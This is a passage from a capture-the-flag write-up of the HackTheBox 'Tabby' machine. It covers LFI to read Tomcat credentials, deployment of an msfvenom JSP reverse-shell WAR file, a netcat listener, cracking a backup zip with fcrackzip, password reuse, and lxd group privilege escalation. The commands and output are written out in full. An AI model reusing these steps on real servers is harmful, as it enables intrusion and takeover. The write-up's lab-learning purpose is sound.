/examples <span class="o">(</span>Status: 302<span class="o">)</span>
/manager <span class="o">(</span>Status: 302<span class="o">)</span>
</code></pre></div></div> <p>Among all the various directories, <em><strong>/manager</strong></em> immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the <strong>LFI</strong> to get them.</p> <p><img src="/assets/images/Screenshots/Tabby/2020-06-22-16-11-37.png" alt="2020-06-22-16-11-37.png" /></p> <p>Finding <strong><em>tomcat-users.xml</em></strong> was a pain as the installation of the web server was done <em>without following standards paths and rules</em>, however, after a couple of hours I was able to read the file, located in <strong><em>/usr/share/tomcat9/etc/tomcat-users.xml</em></strong></p> <p><img src="/assets/images/Screenshots/Tabby/2020-06-22-16-45-05.png" alt="2020-06-22-16-45-05.png" /></p> <p><img src="/assets/images/Screenshots/Tabby/2020-06-22-16-45-57.png" alt="2020-06-22-16-45-57.png" /></p> <p>Good! Now we are able to login into the <strong><em>/manager</em></strong> directory and proceeds.</p> <p>Since the tomcat user are assigned the roles of <strong>admin-gui</strong> and <strong>manager-script</strong>, he has the permission to access the <em>host-manager webapp via web gui</em> (from which nothing can be done) but also to interact <strong><em>via cli with the manager webapp</em></strong>, which allows us to upload <strong>.war files</strong> to the server (see the <a href="https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html">official documentation</a>).</p> <p>Once we find the way, letâ€™s <strong>create our reverse shell</strong> through <strong>msfconsole</strong></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/var/www/html#  msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.18 <span class="nv">LPORT</span><span class="o">=</span>9876 <span class="nt">-f</span> war <span class="o">&gt;</span> maoutis.war
Payload size: 1095 bytes
Final size of war file: 1095 bytes

root@kali:/var/www/html# <span class="nb">ls</span> <span class="nt">-al</span> maoutis.war
<span class="nt">-rw-r--r--</span> 1 root root 1095 Jun 29 19:08 maoutis.war
</code></pre></div></div> <p>load it on the server</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HackTheBox/Machine/Tabby/files# curl <span class="nt">-u</span> <span class="s1">'tomcat'</span>:<span class="s1">'$3cureP4s5w0rd123!'</span> <span class="nt">-T</span> maoutis.war <span class="s1">'http://10.10.10.194:8080/manager/text/deploy?path=/maoutis'</span>
OK - Deployed application at context path <span class="o">[</span>/maoutis]
root@kali:~/HackTheBox/Machine/Tabby/files# curl <span class="nt">-u</span> <span class="s1">'tomcat'</span>:<span class="s1">'$3cureP4s5w0rd123!'</span> http://10.10.10.194:8080/manager/text/list
OK - Listed applications <span class="k">for </span>virtual host <span class="o">[</span>localhost]
/:running:0:ROOT
/maoutis:running:0:maoutis
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
and run it to get access as <span class="k">*</span>tomcat<span class="k">*</span> user.
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HackTheBox/Machine/Tabby/files# curl <span class="nt">-u</span> <span class="s1">'tomcat'</span>:<span class="s1">'$3cureP4s5w0rd123!'</span> http://10.10.10.194:8080/maoutis/
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc <span class="nt">-lvp</span> 9876
python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
tomcat@tabby:/var/lib/tomcat9<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>screen
CTRL+Z
root@kali:~/HackTheBox# <span class="nb">stty </span>raw <span class="nt">-echo</span>
root@kali:~/HackTheBox# <span class="nb">fg

</span>tomcat@tabby:/var/lib/tomcat9<span class="err">$</span>
</code></pre></div></div> <h2 id="lateral-movement-to-ash"> <a href="#lateral-movement-to-ash" class="anchor-heading" aria-labelledby="lateral-movement-to-ash"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Lateral Movement to ash </h2> <p>Once gained the shell, further enumeration reveals that the user of the box is <strong>ash</strong>.</p> <p>Running <strong>LinEnum.sh</strong> we discovered a <strong>.zip backup file</strong> inside <strong><em>/var/www/html/files/</em></strong> which require to be cracked in order to be unzipped. Letâ€™s use <strong>fcrackzip</strong> in order to crack the archive.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> <span class="s1">'/usr/share/wordlists/rockyou.txt'</span> 16162020_backup.zip

PASSWORD FOUND!!!!: pw <span class="o">==</span> admin@it
</code></pre></div></div> <p>Password found! While inside the archive we didnâ€™t find anything useful, trying to use the password to switch to <strong>ash</strong> reveals that the same <em>password has been reused</em>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@tabby:/var/www/html/files<span class="nv">$ </span>su ash                                                                             
Password: admin@it                                                                                                           
ash@tabby:/var/www/html/files<span class="err">$</span>
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
</code></pre></div></div> <p>Well done! We are ash!</p> <h2 id="privilege-escalation"> <a href="#privilege-escalation" class="anchor-heading" aria-labelledby="privilege-escalation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Privilege Escalation </h2> <p>Running again <strong>LinEnum.sh</strong> it reveals that we are members of the <strong>lxd group</strong> and that exists a way to <strong><em>abuse this permission</em></strong> in order <em>to became root</em>. Searching on Google I found <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">this</a> article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD.</p> <p>First, <strong>download</strong> the <strong>lxd-alpine-builder</strong> locally on the kali machine and built it as root</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$git</span> clone https://github.com/saghul/lxd-alpine-builder.git
<span class="nv">$cd</span> lxd-alpine-builder
<span class="nv">$sudo</span> bash build-alpine
</code></pre></div></div> <p>Probably will appear errors like <em>â€œtar: Ignoring unknow â€¦ â€œ</em>. Donâ€™t worry and continue Â Â Â Â with the privilege escalation process.</p> <p>Then <strong>upload</strong> the <strong>.tar</strong> file on the <strong>ash home</strong> directory and <strong>import</strong> it <strong>inside lxc</strong></p> <p><img src="/assets/images/Screenshots/Tabby/2020-06-29-23-27-45.png" alt="2020-06-29-23-27-45.png" /></p> <p>Once finished, we will be root!</p> <h2 id="trophy"> <a href="#trophy" class="anchor-heading" aria-labelledby="trophy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Trophy </h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If you can't give me poetry, can't you give me poetical science?  
- Ada Lovelace
</code></pre></div></div> <h2 id="license"> <a href="#license" class="anchor-heading" aria-labelledby="license"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> License </h2> <p>Author: 0xbro<br /> <a align="left" rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/"><img align="left" alt="Creative Commons Licence" style="border-width:0; margin: 0rem auto;" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" /></a><br /></p> <p>This work is licensed under a <a align="left" rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution-NonCommercial 4.0 International License</a></p> <style> .share { display: block; margin-left: auto; margin-right: auto; text-align: center; } </style> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs> <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol> <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol> <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol> <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol> <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol> <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol> <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol> <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol> <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol> <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111 C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587 c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol> <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol> <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562 C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563 h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243 C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982 c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379 c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379 C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416 c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575 H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685 c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38 c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99 c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522 c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854 c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol> <symbol id="icon-telegram" viewBox="0 0 80 80"> <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" /> </symbol> <symbol id="icon-youtube" viewBox="0 0 24 24"> <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" /> </symbol> <symbol id="icon-gitlab" viewBox="-5 -15 220 200"> <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" /> <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" /> <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" /> &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt; <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" /> <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" /> <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" /> </symbol> </defs></svg> <p><br /></p> <section class="share"> <h2> Share </h2> <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=&quot;&quot;%20https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/%20via%20&#64;0xbro1&amp;hashtags=HackTheBox,Easy,Linux,LFI,WAR,tomcat,cracking-zip-files,lxd-privesc,B2R," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter"> <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg> </a> <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook"> <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg> </a> <a aria-label="Share on Google Plus" href="https://plus.google.com/share?url=https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+"> <svg class="icon icon-google-plus"><use xlink:href="#icon-google-plus"></use></svg> </a> </section> <footer> <p align="center">Made by <code>0x<i>bro</i></code> with ðŸ’œ ðŸ’› </p> </footer> </div> </div> 